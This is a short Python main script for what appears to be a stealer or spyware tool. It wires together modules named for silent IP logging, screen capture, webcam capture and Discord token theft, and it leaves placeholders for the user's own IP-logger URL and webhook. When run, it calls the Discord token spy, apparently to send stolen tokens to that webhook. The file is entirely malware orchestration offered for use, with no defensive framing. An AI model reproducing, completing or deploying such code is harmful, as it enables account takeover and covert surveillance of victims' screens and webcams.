from SilentVisit import SilentVisit
from ScreenSpy import ScreenSpy
from WebcamSpy import WebcamSpy
from DiscordTokenSpy import DiscordTokenSpy


class Main:
    def __init__(self):
        self.url = " Your iplogger url "
        self.webhook_url = " Your webhook "
        self.silent_visit = SilentVisit(self.url)
        self.screen_spy = ScreenSpy()
        self.webcam_spy = WebcamSpy()
        self.discord_token_spy = DiscordTokenSpy(self.webhook_url)

    def run(self):
        self.discord_token_spy.spy()


main_instance = Main()
main_instance.run()
